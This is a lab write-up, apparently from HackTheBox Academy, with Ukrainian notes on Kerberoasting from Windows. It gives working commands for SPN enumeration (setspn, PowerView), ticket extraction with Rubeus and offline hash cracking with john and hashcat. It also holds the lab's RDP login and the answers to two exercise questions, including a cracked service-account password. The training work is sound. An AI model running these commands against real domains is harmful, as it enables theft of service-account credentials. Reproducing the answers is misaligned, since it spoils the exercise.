```markdown
# Kerberoasting - from Windows

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1423](https://academy.hackthebox.com/app/module/143/section/1423) |

***

## 🔑 Ключові команди

### Що таке Kerberoasting з Windows?
Kerberoasting з Windows виконується за допомогою вбудованих інструментів
(setspn.exe) або спеціалізованих тулів (Rubeus). На відміну від Linux підходу,
не потребує Impacket — все виконується прямо з доменної машини.

### Крок 1 — Знайти акаунти з SPN через setspn.exe (вбудований)
```cmd
# Знайти всі SPN в домені
setspn.exe -Q */*

# Знайти конкретний SPN
setspn.exe -Q vmware/*
setspn.exe -Q MSSQLSvc/*
```

### Крок 2 — Отримати TGS тікети через Rubeus
```powershell
cd C:\Tools

# Kerberoast всіх акаунтів
.\Rubeus.exe kerberoast /nowrap

# Kerberoast конкретного акаунту
.\Rubeus.exe kerberoast /user:<username> /nowrap

# Приклад
.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
```

### Крок 3 — Зберегти hash і зламати на Linux
```bash
# Зберегти hash у файл
cat > /tmp/hash.hash << 'EOF'
$krb5tgs$23$*username$DOMAIN$SPN*$HASH...
EOF

# Зламати через john
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.hash

# Або через hashcat
hashcat -m 13100 /tmp/hash.hash /usr/share/wordlists/rockyou.txt
```

### PowerView — enumerate SPN акаунтів
```powershell
Import-Module C:\Tools\PowerView.ps1

# Знайти всі Kerberoastable акаунти
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname

# Знайти конкретний SPN
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname -like "*vmware*"} | `
  Select samaccountname, serviceprincipalname
```

***

## 🧪 Практика

### Середовище

| Параметр | Значення |
|----------|----------|
| Attack Host (Windows) | `10.129.x.x` (ACADEMY-EA-MS01) |
| RDP | `htb-student` / `Academy_student_AD!` |
| DC | `172.16.5.5` (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL) |

### Q1 — What is the name of the service account with the SPN 'vmware/inlanefreight.local'?

```powershell
# Крок 1 — Підключитись по RDP до ACADEMY-EA-MS01
# xfreerdp /u:htb-student /p:'Academy_student_AD!' /v:10.129.x.x

# Крок 2 — Знайти акаунт з SPN vmware/* через setspn.exe
setspn.exe -Q vmware/*
```

```
Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        vmware/inlanefreight.local

Existing SPN found!
```

✅ **Відповідь: `svc_vmwaresso`**

***

### Q2 — Crack the password for this account.

```powershell
# Крок 1 — Отримати TGS тікет через Rubeus на Windows
cd C:\Tools
.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
# Скопіювати hash з виводу ($krb5tgs$23$*...)
```

```bash
# Крок 2 — Зберегти hash на Linux і зламати через john
cat > /tmp/vmware.hash << 'EOF'
$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$...
EOF

john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/vmware.hash
```

```
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23)
Virtual01        (?)
Session completed.
```

✅ **Відповідь: `Virtual01`**
```
